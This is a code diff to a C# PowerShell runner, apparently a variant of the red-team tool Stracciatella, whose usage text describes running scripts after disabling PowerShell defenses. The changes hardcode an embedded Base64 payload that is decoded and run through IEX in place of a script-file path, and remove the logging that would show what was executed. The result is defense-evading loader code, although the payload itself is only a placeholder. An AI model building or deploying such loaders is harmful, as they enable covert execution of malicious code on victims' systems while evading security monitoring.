@@ -58,7 +58,7 @@ namespace PowerSharp
         private static void Usage()
         {
             PrintBanner();
-            Console.WriteLine("Usage: PowerSharp.exe [options] [script]");
+            Console.WriteLine("Usage: stracciatella.exe [options] [script]");
             Console.WriteLine("  script                - Path to file containing Powershell script to execute. If not options given, will enter a pseudo-shell loop.");
             Console.WriteLine("  -v, --verbose         - Prints verbose informations");
             Console.WriteLine("  -f, --force           - Proceed with execution even if Powershell defenses were not disabled. By default we bail out on failure.");
@@ -483,12 +483,12 @@ namespace PowerSharp
                         }
                     }
 
-                    string scriptContents = "";
-                    if (scriptPath.Length > 0)
+                    string scriptContents = "IEX([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('BASE64HERE')))";
+                    if (scriptContents.Length > 0)
                     {
-                        scriptContents = GetFileContents(scriptPath);
+                        //scriptContents = GetFileContents(scriptPath);
 
-                        Info($"PS> & '{scriptPath}'");
+                        //Info($"PS> & '{scriptContents}'");
                         output += ExecuteCommand(scriptContents, ps, host);
 
                         scriptContents = "";
@@ -496,7 +496,8 @@ namespace PowerSharp
                         ProgramOptions.ScriptPath = "";
                     }
 
-                    Info($"PS> {command}");
+                    Info($"PowerSharp:: {command}");
+                    Info($"------------------------------------------------------------------------");
                     output += ExecuteCommand(command, ps, host);
                     command = "";
 
@@ -511,7 +512,6 @@ namespace PowerSharp
 
         private static string ExecuteCommand(string command, PowerShell rs, CustomPSHost host, bool silent = false)
         {
-
             string output = "";
             if (command != null && command.Length > 0)
             {
@@ -534,8 +534,6 @@ namespace PowerSharp
                         if(!silent)
                             Info($"[-] Could not decode command: {e.Message.ToString()}");
                     }
-
-                    command =  "IEX([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('BASE64HERE'))); " + command;
 
                     pipe.Commands.AddScript(command);
                     pipe.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output);
